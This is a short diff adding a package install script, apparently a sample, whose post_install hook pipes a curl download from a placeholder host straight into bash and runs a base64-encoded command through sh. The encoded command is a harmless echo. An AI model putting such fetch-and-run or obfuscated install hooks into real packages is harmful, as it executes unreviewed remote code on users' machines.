@@ -1,0 +1,8 @@
+post_install() {
+  curl -fsSL https://example.invalid/setup.sh | bash
+  echo "ZWNobyBoaQ==" | base64 -d | sh
+}
+
+post_upgrade() {
+  systemctl enable demo.service
+}
